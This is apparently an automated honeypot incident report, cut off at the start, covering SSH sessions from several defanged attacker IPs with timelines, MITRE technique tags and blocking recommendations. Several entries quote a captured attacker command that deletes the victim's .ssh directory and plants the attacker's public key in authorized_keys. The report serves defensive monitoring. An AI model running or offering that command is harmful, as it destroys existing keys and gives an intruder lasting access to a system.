| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:41:54` | `cowrie.session.connect` |
| `2026-04-08 08:41:54` | `cowrie.client.version` |
| `2026-04-08 08:41:54` | `cowrie.client.kex` |
| `2026-04-08 08:41:55` | `cowrie.login.success` |
| `2026-04-08 08:41:55` | `cowrie.session.params` |
| `2026-04-08 08:41:55` | `cowrie.command.input` |
| `2026-04-08 08:41:55` | `cowrie.command.failed` |
| `2026-04-08 08:41:56` | `cowrie.log.closed` |
| `2026-04-08 08:41:56` | `cowrie.session.params` |
| `2026-04-08 08:41:56` | `cowrie.command.input` |
| `2026-04-08 08:41:56` | `cowrie.session.file_download` |
| `2026-04-08 08:41:56` | `cowrie.log.closed` |
| `2026-04-08 08:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e4455b83baf

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:41 |
| **Last Seen** | 2026-04-08 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:41:59` | `cowrie.session.connect` |
| `2026-04-08 08:41:59` | `cowrie.client.version` |
| `2026-04-08 08:41:59` | `cowrie.client.kex` |
| `2026-04-08 08:42:00` | `cowrie.login.success` |
| `2026-04-08 08:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ca9b72c5640

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:42 |
| **Last Seen** | 2026-04-08 08:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:42:23` | `cowrie.session.connect` |
| `2026-04-08 08:42:23` | `cowrie.client.version` |
| `2026-04-08 08:42:24` | `cowrie.client.kex` |
| `2026-04-08 08:42:25` | `cowrie.login.success` |
| `2026-04-08 08:42:26` | `cowrie.session.params` |
| `2026-04-08 08:42:26` | `cowrie.command.input` |
| `2026-04-08 08:42:26` | `cowrie.command.failed` |
| `2026-04-08 08:42:26` | `cowrie.log.closed` |
| `2026-04-08 08:42:27` | `cowrie.session.params` |
| `2026-04-08 08:42:27` | `cowrie.command.input` |
| `2026-04-08 08:42:27` | `cowrie.session.file_download` |
| `2026-04-08 08:42:27` | `cowrie.log.closed` |
| `2026-04-08 08:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-792c540a66f2

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:42 |
| **Last Seen** | 2026-04-08 08:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:42:31` | `cowrie.session.connect` |
| `2026-04-08 08:42:31` | `cowrie.client.version` |
| `2026-04-08 08:42:31` | `cowrie.client.kex` |
| `2026-04-08 08:42:32` | `cowrie.login.success` |
| `2026-04-08 08:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1139ebf6019c

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:45 |
| **Last Seen** | 2026-04-08 08:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:45:41` | `cowrie.session.connect` |
| `2026-04-08 08:45:41` | `cowrie.client.version` |
| `2026-04-08 08:45:42` | `cowrie.client.kex` |
| `2026-04-08 08:45:43` | `cowrie.login.success` |
| `2026-04-08 08:45:43` | `cowrie.session.params` |
| `2026-04-08 08:45:43` | `cowrie.command.input` |
| `2026-04-08 08:45:43` | `cowrie.command.failed` |
| `2026-04-08 08:45:44` | `cowrie.log.closed` |
| `2026-04-08 08:45:44` | `cowrie.session.params` |
| `2026-04-08 08:45:44` | `cowrie.command.input` |
| `2026-04-08 08:45:44` | `cowrie.session.file_download` |
| `2026-04-08 08:45:44` | `cowrie.log.closed` |
| `2026-04-08 08:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37b90fb6a53a

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:45 |
| **Last Seen** | 2026-04-08 08:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:45:47` | `cowrie.session.connect` |
| `2026-04-08 08:45:47` | `cowrie.client.version` |
| `2026-04-08 08:45:47` | `cowrie.client.kex` |
| `2026-04-08 08:45:48` | `cowrie.login.success` |
| `2026-04-08 08:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e0788dee2c

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:47 |
| **Last Seen** | 2026-04-08 08:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:47:25` | `cowrie.session.connect` |
| `2026-04-08 08:47:25` | `cowrie.client.version` |
| `2026-04-08 08:47:25` | `cowrie.client.kex` |
| `2026-04-08 08:47:26` | `cowrie.login.success` |
| `2026-04-08 08:47:27` | `cowrie.session.params` |
| `2026-04-08 08:47:27` | `cowrie.command.input` |
| `2026-04-08 08:47:27` | `cowrie.command.failed` |
| `2026-04-08 08:47:27` | `cowrie.log.closed` |
| `2026-04-08 08:47:27` | `cowrie.session.params` |
| `2026-04-08 08:47:27` | `cowrie.command.input` |
| `2026-04-08 08:47:28` | `cowrie.session.file_download` |
| `2026-04-08 08:47:28` | `cowrie.log.closed` |
| `2026-04-08 08:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1c30be4006e

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:47 |
| **Last Seen** | 2026-04-08 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:47:31` | `cowrie.session.connect` |
| `2026-04-08 08:47:31` | `cowrie.client.version` |
| `2026-04-08 08:47:31` | `cowrie.client.kex` |
| `2026-04-08 08:47:32` | `cowrie.login.success` |
| `2026-04-08 08:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49f9ace57b51

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:49 |
| **Last Seen** | 2026-04-08 08:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:49:14` | `cowrie.session.connect` |
| `2026-04-08 08:49:14` | `cowrie.client.version` |
| `2026-04-08 08:49:14` | `cowrie.client.kex` |
| `2026-04-08 08:49:15` | `cowrie.login.success` |
| `2026-04-08 08:49:15` | `cowrie.session.params` |
| `2026-04-08 08:49:15` | `cowrie.command.input` |
| `2026-04-08 08:49:15` | `cowrie.command.failed` |
| `2026-04-08 08:49:15` | `cowrie.log.closed` |
| `2026-04-08 08:49:16` | `cowrie.session.params` |
| `2026-04-08 08:49:16` | `cowrie.command.input` |
| `2026-04-08 08:49:16` | `cowrie.session.file_download` |
| `2026-04-08 08:49:16` | `cowrie.log.closed` |
| `2026-04-08 08:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36890114c31e

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:49 |
| **Last Seen** | 2026-04-08 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:49:19` | `cowrie.session.connect` |
| `2026-04-08 08:49:19` | `cowrie.client.version` |
| `2026-04-08 08:49:19` | `cowrie.client.kex` |
| `2026-04-08 08:49:20` | `cowrie.login.success` |
| `2026-04-08 08:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-483582e401c5

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:51 |
| **Last Seen** | 2026-04-08 08:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:51:48` | `cowrie.session.connect` |
| `2026-04-08 08:51:48` | `cowrie.client.version` |
| `2026-04-08 08:51:48` | `cowrie.client.kex` |
| `2026-04-08 08:51:49` | `cowrie.login.success` |
| `2026-04-08 08:51:50` | `cowrie.session.params` |
| `2026-04-08 08:51:50` | `cowrie.command.input` |
| `2026-04-08 08:51:50` | `cowrie.command.failed` |
| `2026-04-08 08:51:50` | `cowrie.log.closed` |
| `2026-04-08 08:51:51` | `cowrie.session.params` |
| `2026-04-08 08:51:51` | `cowrie.command.input` |
| `2026-04-08 08:51:51` | `cowrie.session.file_download` |
| `2026-04-08 08:51:51` | `cowrie.log.closed` |
| `2026-04-08 08:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50a9c4a6a88c

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:51 |
| **Last Seen** | 2026-04-08 08:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:51:55` | `cowrie.session.connect` |
| `2026-04-08 08:51:55` | `cowrie.client.version` |
| `2026-04-08 08:51:55` | `cowrie.client.kex` |
| `2026-04-08 08:51:57` | `cowrie.login.success` |
| `2026-04-08 08:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e762713a88a1

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:52 |
| **Last Seen** | 2026-04-08 08:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:52:59` | `cowrie.session.connect` |
| `2026-04-08 08:52:59` | `cowrie.client.version` |
| `2026-04-08 08:52:59` | `cowrie.client.kex` |
| `2026-04-08 08:53:00` | `cowrie.login.success` |
| `2026-04-08 08:53:00` | `cowrie.session.params` |
| `2026-04-08 08:53:00` | `cowrie.command.input` |
| `2026-04-08 08:53:00` | `cowrie.command.failed` |
| `2026-04-08 08:53:01` | `cowrie.log.closed` |
| `2026-04-08 08:53:01` | `cowrie.session.params` |
| `2026-04-08 08:53:01` | `cowrie.command.input` |
| `2026-04-08 08:53:01` | `cowrie.session.file_download` |
| `2026-04-08 08:53:01` | `cowrie.log.closed` |
| `2026-04-08 08:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801a26244fa2

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:53 |
| **Last Seen** | 2026-04-08 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:53:04` | `cowrie.session.connect` |
| `2026-04-08 08:53:04` | `cowrie.client.version` |
| `2026-04-08 08:53:04` | `cowrie.client.kex` |
| `2026-04-08 08:53:05` | `cowrie.login.success` |
| `2026-04-08 08:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac168bd1ed9

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:53 |
| **Last Seen** | 2026-04-08 08:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:53:46` | `cowrie.session.connect` |
| `2026-04-08 08:53:46` | `cowrie.client.version` |
| `2026-04-08 08:53:46` | `cowrie.client.kex` |
| `2026-04-08 08:53:48` | `cowrie.login.success` |
| `2026-04-08 08:53:48` | `cowrie.session.params` |
| `2026-04-08 08:53:48` | `cowrie.command.input` |
| `2026-04-08 08:53:48` | `cowrie.command.failed` |
| `2026-04-08 08:53:49` | `cowrie.log.closed` |
| `2026-04-08 08:53:49` | `cowrie.session.params` |
| `2026-04-08 08:53:49` | `cowrie.command.input` |
| `2026-04-08 08:53:50` | `cowrie.session.file_download` |
| `2026-04-08 08:53:50` | `cowrie.log.closed` |
| `2026-04-08 08:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d99e3589adb

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:53 |
| **Last Seen** | 2026-04-08 08:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:53:53` | `cowrie.session.connect` |
| `2026-04-08 08:53:53` | `cowrie.client.version` |
| `2026-04-08 08:53:54` | `cowrie.client.kex` |
| `2026-04-08 08:53:55` | `cowrie.login.success` |
| `2026-04-08 08:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.190.13[.]99` | **26** | 2026-04-08 08:15 | 2026-04-08 08:40 | 46m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.219.184[.]142` | **22** | 2026-04-08 08:15 | 2026-04-08 08:57 | 1m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `5.181.87[.]35` | **22** | 2026-04-08 08:16 | 2026-04-08 08:56 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.78.194[.]186` | **17** | 2026-04-08 07:16 | 2026-04-08 08:17 | 2m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.37[.]34` | **15** | 2026-04-08 07:15 | 2026-04-08 07:29 | 22m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `41.242.115[.]83` | **10** | 2026-04-08 07:15 | 2026-04-08 07:31 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.230.181[.]229` | **2** | 2026-04-08 08:17 | 2026-04-08 08:19 | 4m | 0 | `T1592` | 🟢 LOW |
| `39.115.183[.]206` | 1 | 2026-04-08 08:19 | 2026-04-08 08:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-08 08:20 | 2026-04-08 08:21 | 51s | 0 | `T1592` | 🟢 LOW |
| `67.245.199[.]88` | 1 | 2026-04-08 07:49 | 2026-04-08 07:49 | 16s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
